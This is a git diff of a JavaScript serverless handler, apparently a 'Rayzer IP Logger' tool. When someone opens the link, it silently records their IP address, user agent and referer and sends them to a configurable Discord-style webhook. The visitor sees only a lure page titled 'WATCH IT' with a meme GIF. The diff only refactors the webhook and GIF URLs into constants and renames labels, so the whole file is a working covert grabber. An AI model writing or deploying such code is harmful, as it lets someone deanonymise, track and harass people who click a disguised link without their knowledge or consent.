@@ -1,7 +1,10 @@
 // /api/rayzer.js
 
+// CONFIGURATION
+const WEBHOOK_URL = "PUT YOUR WEBHOOK HERE"; // webhook url
+const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif"; // gif url
+
 export default async function handler(req, res) {
-  const webhookUrl = "PUT YOUR WEBHOOK HERE";
   const ip = (req.headers["x-forwarded-for"] || req.connection.remoteAddress || "").split(",")[0].trim();
   const userAgent = req.headers["user-agent"] || "Yok";
   const referer = req.headers["referer"] || "Yok";
@@ -16,10 +19,10 @@ export default async function handler(req, res) {
   }
 
   const embed = {
-    username: "IP Logger",
+    username: "Rayzer IP Logger",
     embeds: [
       {
-        title: "New Visitor 🔍",
+        title: "New Log 🔍",
         color: 0x2f3136,
         fields: [
           { name: "IP", value: `\`${ip}\``, inline: true },
@@ -36,19 +39,20 @@ export default async function handler(req, res) {
     ]
   };
 
-  fetch(webhookUrl, {
+
+  fetch(WEBHOOK_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(embed)
-  }).catch(() => {});
+  }).catch(() => { });
 
   res.setHeader("Content-Type", "text/html");
   res.status(200).send(`
     <!DOCTYPE html>
     <html>
-      <head><title>Rayzer</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
+      <head><title>WATCH IT</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
       <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
-        <img src="https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif" style="max-width:100%;height:auto;" />
+        <img src="${GIF_URL}" style="max-width:100%;height:auto;" />
       </body>
     </html>
   `);
